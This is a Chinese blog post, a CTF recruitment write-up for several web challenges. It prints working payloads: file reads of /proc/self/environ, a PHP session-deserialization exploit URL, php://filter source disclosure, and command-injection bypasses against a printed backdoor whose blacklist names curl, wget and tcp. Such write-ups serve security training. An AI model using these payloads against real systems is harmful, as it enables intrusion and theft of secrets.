@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+
+
+  <meta name="description" content="CNSS Recruit 2021——web_wp1.To_be_admin 观察到最下面一行的提示，那就是先要读取一些文件。 因为从题目知可能要伪造admin身份,就查看一下token，解码后发现username为guest，那就改为admin，重新传进去token并发送，但是报错。  所以可能还需要密钥验证，那就可能在我们要读的file中，所以读取环境变量，那就构造payload:&#x2F;read?">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CNSS-Recruit—2021—web_wp">
+<meta property="og:url" content="http://example.com/2021/11/17/CNSS-Recruit%E2%80%942021%E2%80%94web-wp/index.html">
+<meta property="og:site_name" content="huhuの博客">
+<meta property="og:description" content="CNSS Recruit 2021——web_wp1.To_be_admin 观察到最下面一行的提示，那就是先要读取一些文件。 因为从题目知可能要伪造admin身份,就查看一下token，解码后发现username为guest，那就改为admin，重新传进去token并发送，但是报错。  所以可能还需要密钥验证，那就可能在我们要读的file中，所以读取环境变量，那就构造payload:&#x2F;read?">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211008200128093.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211008200521598.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211008201324238.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211008201130684.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211008204825655.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211009141404616.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211009142329672.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211012191303238.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211009143301272.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211012132055620.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211012132147867.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211012132644853.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211012133229892.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211012133439175.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211012135205958.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211012154057879.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211012154200178.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211012155505800.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211012155556849.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211012155823340.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211012155337515.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211012164237408.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211012164557424.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211012165239858.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211012193821800.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211013132505527.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211013132557171.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211014215546856.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211021151745084.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211021152749182.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211021162846670.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211105150508197.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211105150525425.png">
+<meta property="og:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211021162506147.png">
+<meta property="article:published_time" content="2021-11-17T07:26:12.000Z">
+<meta property="article:modified_time" content="2021-11-17T07:31:33.513Z">
+<meta property="article:author" content="huhu">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/SMY/AppData/Roaming/Typora/typora-user-images/image-20211008200128093.png">
+
+<link rel="canonical" href="http://example.com/2021/11/17/CNSS-Recruit%E2%80%942021%E2%80%94web-wp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CNSS-Recruit—2021—web_wp | huhuの博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+  <script src="/live2d-widget/autoload.js"></script>
+
+<link rel="alternate" href="/atom.xml" title="huhuの博客" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+	<a target="_blank" rel="noopener" href="https://huhusmang.github.io" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#fff; color:#151513; position: absolute; top: 0; border: 0; left: 0; transform: scale(-1, 1);" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">huhuの博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">记录生活中的点点滴滴</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">2</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">2</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">3</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/17/CNSS-Recruit%E2%80%942021%E2%80%94web-wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="huhu">
+      <meta itemprop="description" content="never give up">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="huhuの博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CNSS-Recruit—2021—web_wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-17 15:26:12 / 修改时间：15:31:33" itemprop="dateCreated datePublished" datetime="2021-11-17T15:26:12+08:00">2021-11-17</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Study/" itemprop="url" rel="index"><span itemprop="name">Study</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="CNSS-Recruit-2021——web-wp"><a href="#CNSS-Recruit-2021——web-wp" class="headerlink" title="CNSS Recruit 2021——web_wp"></a>CNSS Recruit 2021——web_wp</h1><h2 id="1-To-be-admin"><a href="#1-To-be-admin" class="headerlink" title="1.To_be_admin"></a>1.To_be_admin</h2><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211008200128093.png" alt="image-20211008200128093"></p>
+<p>观察到最下面一行的提示，那就是先要读取一些文件。</p>
+<p>因为从题目知可能要伪造admin身份,就查看一下token，解码后发现username为guest，那就改为admin，重新传进去token并发送，但是报错。</p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211008200521598.png" alt="image-20211008200521598"></p>
+<p>所以可能还需要密钥验证，那就可能在我们要读的file中，所以读取环境变量，那就构造payload:/read?<strong>file=/proc/self/environ,尝试读取网页的环境变量</strong>，发现正有我们要找的key。</p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211008201324238.png" alt="image-20211008201324238"></p>
+<p>将参数传进去在添加密钥，就能得到修改后的token了，在传进网页就可以获取flag了。</p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211008201130684.png" alt="image-20211008201130684"></p>
+<h2 id="2-To-be-admin-again"><a href="#2-To-be-admin-again" class="headerlink" title="2.To_be_admin_again"></a>2.To_be_admin_again</h2><p>访问题目地址发现是一段PHP代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNSS</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = <span class="variable">$cmd</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// You must be interested in save.php</span></span><br></pre></td></tr></table></figure>
+
+<p>注意最后一句话的注释：You must be interested in save.php，所以访问一下save.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cnss&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;cnss&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;cnss&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析代码，我们要赋值一个变量cnss，并且会保存到session中，并且根据上一个网页可知，会提取session里的内容并进行序列化。</p>
+<p>但是返现_wakeup()函数始终会把username赋值为guest，所以可以选择绕过wakeup函数，直接自己写一个PHP代码并执行：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNSS</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code =<span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>;<span class="comment">//列出目前工作目录所含之文件及子目录</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="keyword">new</span> CNSS());</span><br><span class="line"><span class="variable">$a</span> = str_replace(<span class="string">&#x27;:2:&#x27;</span>,<span class="string">&#x27;:3:&#x27;</span>,<span class="variable">$a</span>);<span class="comment">//利用CVE漏洞绕过_wakeup()函数</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>将得到的$a的值赋给cnss,传进去，在访问index,php就可以得到flag!</p>
+<p>payload为：<a target="_blank" rel="noopener" href="http://121.41.7.149:65004/save.php?cnss=%7CO:4:%22CNSS%22:3:%7Bs:14:%22%00CNSS%00username%22;s:5:%22admin%22;s:10:%22%00CNSS%00code%22;s:37:%22var_dump(file_get_contents(%27/flag%27));%22;%7D">http://121.41.7.149:65004/save.php?cnss=|O%3A4%3A%22CNSS%22%3A3%3A%7Bs%3A14%3A%22%00CNSS%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A10%3A%22%00CNSS%00code%22%3Bs%3A37%3A%22var_dump%28file_get_contents%28%27%2Fflag%27%29%29%3B%22%3B%7D</a></p>
+<p>注意要加个|，考的是session反序列化漏洞！！！还有就是save.php后不是/?,而是直接？</p>
+<p>附上一篇博客地址：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43431158/article/details/99544797?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163422476716780269873130%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163422476716780269873130&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~sobaiduend~default-2-99544797.pc_v2_rank_blog_default&amp;utm_term=session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;spm=1018.2226.3001.4450">https://blog.csdn.net/qq_43431158/article/details/99544797?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163422476716780269873130%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163422476716780269873130&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~sobaiduend~default-2-99544797.pc_v2_rank_blog_default&amp;utm_term=session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;spm=1018.2226.3001.4450</a></p>
+<img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211008204825655.png" alt="image-20211008204825655" style="zoom: 50%;" />
+
+
+
+<h2 id="3-Blackpage"><a href="#3-Blackpage" class="headerlink" title="3.Blackpage"></a>3.Blackpage</h2><p>打开题目地址，就是一个网页图片。查看源码，发现最上部有注释，提示是读到mybackdoor.php。</p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211009141404616.png" alt="image-20211009141404616"></p>
+<p>代码中要传file参数，所以可以试着<strong>伪协议读取</strong>，构造payload:/?file=php://filter/read=convert.base64-encode/resource=mybackdoor.php,打开原码即可读到base64编码的一段代码：</p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211009142329672.png" alt="image-20211009142329672"></p>
+<p>转义过后得到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$filter</span> = <span class="string">&quot;(\\&lt;|\\&gt;|Fl4g|php|curl| |0x|\\\\|python|gcc|less|root|etc|pass|http|ftp|cd|tcp|udp|cat|×|flag|ph|hp|wget|type|ty|\\$\\&#123;IFS\\&#125;|index|\\*)&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="string">&quot;/&quot;</span>.<span class="variable">$filter</span>.<span class="string">&quot;/is&quot;</span>,<span class="variable">$cmd</span>)==<span class="number">1</span>)&#123;  </span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">&#x27;Go out! This black page does not belong to you!&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    system(<span class="variable">$cmd</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">blacklist(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>发现可以传参执行命令，现在就先找flag文件在哪，利用<strong>根目录命令</strong>，构造payload为：/mybackdoor.php?<strong>cmd=ls%09/</strong>,读到falg文件：</p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012191303238.png" alt="image-20211012191303238"></p>
+<p>之后是正则匹配绕过，<strong>利用tac输出文件，同时用fl?g替换flag</strong>，（或者fl$1ag）构造payload为：/mybackdoor.php?cmd=tac%09/Fl?g_is_here,得到flag:</p>
+<img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211009143301272.png" alt="image-20211009143301272" style="zoom: 50%;" />
+
+
+
+<h2 id="4-Debuger"><a href="#4-Debuger" class="headerlink" title="4.Debuger"></a>4.Debuger</h2><p>打开题目地址是俄罗斯方块游戏，像查看原码发现右键和F12都被禁用了，所以采用vie-source方法查看网页源码，得到如图：</p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012132055620.png" alt="image-20211012132055620"></p>
+<p>发现js网页，点开就得到flag了~</p>
+<img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012132147867.png" alt="image-20211012132147867" style="zoom: 67%;" />
+
+
+
+<h2 id="5-signin"><a href="#5-signin" class="headerlink" title="5.signin"></a>5.signin</h2><p>打开题目描述是：Please Change Your Method!      所以打开F12发现请求是get,所以更改为POST，响应为：</p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012132644853.png" alt="image-20211012132644853"></p>
+<p>发现为一段PHP代码，要传参CNSS和web,分别为POST和GET方式，所以构造payload为：<a target="_blank" rel="noopener" href="http://121.41.7.149:60001/?web=like">http://121.41.7.149:60001/?web=like</a></p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012133229892.png" alt="image-20211012133229892"></p>
+<p>此时flag = 0,要显示出flag还要使flag = 1，所以抓包到brupsite修改flag = 1,即可得到flag:</p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012133439175.png" alt="image-20211012133439175"></p>
+<h2 id="6-😃Easy-更坑的数学题"><a href="#6-😃Easy-更坑的数学题" class="headerlink" title="6.[😃Easy]更坑的数学题"></a>6.[😃Easy]更坑的数学题</h2><p>通过刷新网页发现每次要计算的数字都不是固定的，并且要在1s钟内，所以写个脚本代替我们计算：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://81.68.109.40:30005/&#x27;</span></span><br><span class="line">a = requests.Session()</span><br><span class="line">al = a.get(url)</span><br><span class="line"></span><br><span class="line">b = al.text</span><br><span class="line">b1 =b.find(<span class="string">&#x27;p&gt;&#x27;</span>)</span><br><span class="line">b2 =b.find(<span class="string">&#x27;=&lt;/p&gt;&#x27;</span>,b1)</span><br><span class="line">b3 = b[b1+<span class="number">22</span>:b2]</span><br><span class="line">b4= <span class="built_in">eval</span>(b3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c1 = &#123;<span class="string">&quot;res&quot;</span>:b4&#125;</span><br><span class="line">a2 = a.post(url,c1)</span><br><span class="line"><span class="built_in">print</span>(a2.text)</span><br></pre></td></tr></table></figure>
+
+<p>运行后得到flag:</p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012135205958.png" alt="image-20211012135205958"></p>
+<h2 id="7-😃Easy-Ezp-p"><a href="#7-😃Easy-Ezp-p" class="headerlink" title="7.[😃Easy]Ezp#p"></a>7.[😃Easy]Ezp#p</h2><p>打开题目是一段PHP代码，审计代码题，如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pass</span> = <span class="string">&#x27;0e0&#x27;</span>;</span><br><span class="line">    <span class="variable">$md55</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    <span class="variable">$md55</span> = md5(<span class="variable">$md55</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="variable">$md55</span>) == <span 